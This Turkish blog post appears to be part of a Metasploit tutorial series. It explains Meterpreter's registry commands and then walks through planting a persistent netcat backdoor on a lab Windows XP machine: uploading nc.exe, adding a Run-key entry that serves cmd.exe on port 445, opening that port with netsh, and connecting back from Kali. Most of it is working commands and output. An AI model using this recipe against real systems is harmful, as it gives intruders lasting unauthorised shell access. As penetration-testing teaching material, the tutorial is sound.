---

authors:
  - name: İbrahim Korucuoğlu
    link: https://github.com/siberoloji
    image: https://github.com/siberoloji.png


categories:
- Metasploit Framework
classicmag_header_overlay:
- global-layout
classicmag_post_layout:
- layout-1
classicmag_post_sidebar_option:
- right-sidebar
date: "2017-06-05T13:27:00Z"
excerpt: Windows Registry ayarları, neredeyse tüm işlemlerin kayıtlarının tutulduğu
  sihirli bir alan gibidir. Bu alanda yapacağınız tek bir değişiklik, sistemde gerekli
  yetkiyi almanızı sağlayabilir. Bunun yanında, yapılacak hatalı bir işlem ise sistemin
  bir daha açılmamasına da sebep olabilir. Dikkatli ve acele etmeden hareket etmek
  gerekmektedir.
guid: https://www.siberoloji.com/?p=1185
id: 1185
image: /assets/images/2024/06/metasploit.jpg
tags:
- cybersecurity
- metasploit framework
title: MSF Registry Üzerinde Çalışma
url: /tr/msf-registry-uzerinde-calisma/
---

<!-- wp:heading {"level":1} -->
<h1 class="wp-block-heading" id="windows-registry-i̇şlemleri">Windows Registry İşlemleri 
<!-- /wp:heading -->

  Windows Registry ayarları, neredeyse tüm işlemlerin kayıtlarının tutulduğu sihirli bir alan gibidir. Bu alanda yapacağınız tek bir değişiklik, sistemde gerekli yetkiyi almanızı sağlayabilir. Bunun yanında, yapılacak hatalı bir işlem ise sistemin bir daha açılmamasına da sebep olabilir. Dikkatli ve acele etmeden hareket etmek gerekmektedir. 
 

  Meterpreter, Windows Registry üzerinde işlem yapmanızı sağlayacak bir çok komut sunmaktadır. Bunlara kısaca bakalım. Bir sistemde Meterpreter shell açtığınızda&nbsp;<code>reg</code>&nbsp;komutunu verdiğinizde yardım bilgilerini görebilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  reg
Usage: reg ***[*** command***]***  ***[*** options]

Interact with the target machine's registry.

OPTIONS:

    -d   The data to store in the registry value.
    -h   Help menu.
    -k   The registry key path (E.g. HKLM\Software\Foo).
    -t   The registry value type (E.g. REG_SZ).
    -v   The registry value name (E.g. Stuff).

COMMANDS:

    enumkey    Enumerate the supplied registry key [-k &gt;key&gt;]
    createkey  Create the supplied registry key  [-k &gt;key&gt;]
    deletekey  Delete the supplied registry key  [-k &gt;key&gt;]
    queryclass Queries the class of the supplied key [-k &gt;key&gt;]
    setval     Set a registry value [-k &gt;key&gt; -v &gt;val&gt; -d &gt;data&gt;]
    deleteval  Delete the supplied registry value [-k &gt;key&gt; -v &gt;val&gt;]
    queryval   Queries the data contents of a value [-k &gt;key&gt; -v &gt;val&gt;]
</code></pre>
<!-- /wp:code -->

  Yardım komutunun sonucunda görebileceğiniz gibi,&nbsp;<code>reg</code>&nbsp;komutu, Registry üzerinde okuma (<code>queryval</code>), yazma (<code>setval</code>), yeni ayarlama oluşturma (<code>createkey</code>) ve silme (<code>deletekey</code>) olanağı sağlamaktadır. 
 

  Bu komutlar sayesinde yeni değerler oluşturma, değerleri değiştirme yapabileceğiniz gibi doğru yerlere bakarak sistem hakkında bilgi toplama işlemleri de yapabilirsiniz. Windows Registry içerisinde hangi değerin nerede kayıt edildiği hakkında kendinizi geliştirmenizi tavsiye ediyorum. Bir fikir vermesi açısından bağlantıda bulunan PDF dosyasını inceleyebilirsiniz.&nbsp;<a href="https://support.accessdata.com/hc/en-us/article_attachments/201717329/Registry_Quick_Find_Chart_9-27-10.pdf">List</a> 
 

 
<h2 class="wp-block-heading" id="kalıcı-netcat-arka-kapısı">Kalıcı Netcat Arka Kapısı
<!-- /wp:heading -->

  Aşağıda adım adım gerçekleştireceğimiz örnekte, hedef sisteme&nbsp;<code>netcat</code>&nbsp;programını yerleştireceğiz. Registry ayarlarında işlemler yaparak&nbsp;<code>netcat</code>&nbsp;programının bilgisayar açıldığında otomatik başlamasını ayarlayacağız. Sistemde bulunan Firewall ayarlarının,&nbsp;<code>netcat</code>&nbsp;programına ve 445 numaralı porta müsaade etmesini sağlayacağız. 
 


<h3 class="wp-block-heading" id="ncexe-programını-yükleme">nc.exe Programını Yükleme
<!-- /wp:heading -->

  Öncelikle hedef Windows işletim sisteminin içerisine&nbsp;<code>nc.exe</code>&nbsp;olarak bilinen netcat programını yükleyelim. Bunun için önceden bir şekilde meterpreter shell açmış olmalısınız. Bununla ilgili örnekleri önceki yazılarımızda belirtmiştik. Kali işletim sistemi içerisinde&nbsp;<code>/usr/share/windows-binaries/</code>&nbsp;klasöründe faydalı bir kaç programı bulabilirsiniz. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  upload /usr/share/windows-binaries/nc.exe C:\\windows\\system32
***[*** ******* ***]***  uploading  : /tmp/nc.exe -&gt; C:\windows\system32
***[*** ******* ***]***  uploaded   : /tmp/nc.exe -&gt; C:\windows\system32nc.exe
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="netcat-başlangıçta-otomatik-çalışsın">netcat Başlangıçta Otomatik Çalışsın
<!-- /wp:heading -->

  nc.exe programının işletim sisteminin her başladığında çalışması için Registry içinde&nbsp;<code>HKLM\software\microsoft\windows\currentversion\run</code>&nbsp;anahtarına bir değer oluşturmalısınız. Öncelikle, mevcut değerleri ve ayarları görelim. Ters \ işaretlerinin iki defa yazıldığına dikkat edin. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
Enumerating: HKLM\software\microsoft\windows\currentversion\run

  Values ***(*** 3***)*** :

    VMware Tools
    VMware User Process
    quicktftpserver
</code></pre>
<!-- /wp:code -->

  Komut çıktısında görüldüğü gibi şu an için&nbsp;<code>VMware Tools, VMware User Process, quicktftpserver</code>&nbsp;yazılımları otomatik başlamaya ayarlanmış durumda. Biz yeni ayarımızı&nbsp;<code>reg setval</code>&nbsp;komutu ile ilave edelim ve&nbsp;<code>reg queryval</code>&nbsp;komutu ile tekrar kontrol edelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v nc -d 'C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe'
Successful set nc.
meterpreter ***&gt;***  reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v nc
Key: HKLM\software\microsoft\windows\currentversion\Run
Name: nc
Type: REG_SZ
Data: C:\windows\system32\nc.exe -Ldp 445 -e cmd.exe
</code></pre>
<!-- /wp:code -->


<h3 class="wp-block-heading" id="firewall-ayarları">Firewall Ayarları
<!-- /wp:heading -->

  Doğrudan Registry ayarlarından yapabileceğinizi gibi&nbsp;<code>netsh</code>&nbsp;komutu ile de firewall ayarlarını yapabilirsiniz. Kullanımı göstermek açısından, firewall ayarlarını komut satırından ayarlayalım. Bunun için Meterpreter komut satırından Windows komut satırına girelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">meterpreter ***&gt;***  execute -f cmd -i
Process 1604 created.
Channel 1 created.
Microsoft Windows XP ***[*** Version 5.1.2600]
***(*** C***)***  Copyright 1985-2001 Microsoft Corp.
C:\ ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Firewall ayarlarının mevcut halini görelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ ***&gt;***  netsh firewall show opmode
Netsh firewall show opmode

Domain profile configuration:
-------------------------------------------------------------------
Operational mode                  ***=***  Enable
Exception mode                    ***=***  Enable

Standard profile configuration ***(*** current***)*** :
-------------------------------------------------------------------
Operational mode                  ***=***  Enable
Exception mode                    ***=***  Enable

Local Area Connection firewall configuration:
-------------------------------------------------------------------
Operational mode                  ***=***  Enable
</code></pre>
<!-- /wp:code -->

  Şimdi 445 numaralı Portu izin verilen Portlar arasına ekleyelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ ***&gt;***  netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
netsh firewall add portopening TCP 445 "Service Firewall" ENABLE ALL
Ok.
</code></pre>
<!-- /wp:code -->

  Yaptığımız işlemin hayata geçip geçmediğini kontrol edelim. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">C:\ ***&gt;***  netsh firewall show portopening
netsh firewall show portopening

Port configuration ***for *** Domain profile:
Port   Protocol  Mode     Name
-------------------------------------------------------------------
139    TCP       Enable   NetBIOS Session Service
445    TCP       Enable   SMB over TCP
137    UDP       Enable   NetBIOS Name Service
138    UDP       Enable   NetBIOS Datagram Service

Port configuration ***for *** Standard profile:
Port   Protocol  Mode     Name
-------------------------------------------------------------------
445    TCP       Enable   Service Firewall
139    TCP       Enable   NetBIOS Session Service
445    TCP       Enable   SMB over TCP
137    UDP       Enable   NetBIOS Name Service
138    UDP       Enable   NetBIOS Datagram Service


C:\ ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Hedef sistem tekrar başladığında&nbsp;<code>nc.exe</code>&nbsp;otomatik olarak çalışacak ve dışarıdan bağlantılara imkan sağlayacaktır. Aşağıdaki örnekte&nbsp;<code>nc</code>&nbsp;komutuyla hedef sisteme bağlanılabildiği görülmektedir. 
 

<!-- wp:code -->
<pre class="wp-block-code"><code lang="bash" class="language-bash">root@kali:~# nc -v 172.16.104.128 445
172.16.104.128: inverse host lookup failed: Unknown server error : Connection timed out
***(*** UNKNOWN***)***  ***[*** 172.16.104.128] 445 ***(*** ?***)***  open
Microsoft Windows XP ***[*** Version 5.1.2600]
***(*** C***)***  Copyright 1985-2001 Microsoft Corp.

C:\ ***&gt;***  dir
dir
Volume ***in *** drive C has no label.
Volume Serial Number is E423-E726

Directory of C:\

05/03/2009 01:43 AM
.
05/03/2009 01:43 AM
..
05/03/2009 01:26 AM 0 ;i
05/12/2009 10:53 PM
Desktop
10/29/2008 05:55 PM
Favorites
05/12/2009 10:53 PM
My Documents
05/03/2009 01:43 AM 0 QCY
10/29/2008 03:51 AM
Start Menu
05/03/2009 01:25 AM 0 talltelnet.log
05/03/2009 01:25 AM 0 talltftp.log
4 File***(*** s***)***  0 bytes
6 Dir***(*** s***)***  35,540,791,296 bytes free

C:\ ***&gt;*** 
</code></pre>
<!-- /wp:code -->

  Gerçek durumlarda, böyle bir arka kapı açmak bu kadar kolay olmasa da uygulanacak işlemlerin mantığı yukarıda anlatıldığı gibidir. Bu yazıda, Registry kayıtları kullanarak bir arka kapı açmanın mantığını açıklamaya çalıştık. Yukarıdaki örneği birebir uygulayıp başarısız olursanız umutsuzluğa kapılmayın. Daha sıkı çalışın. 
 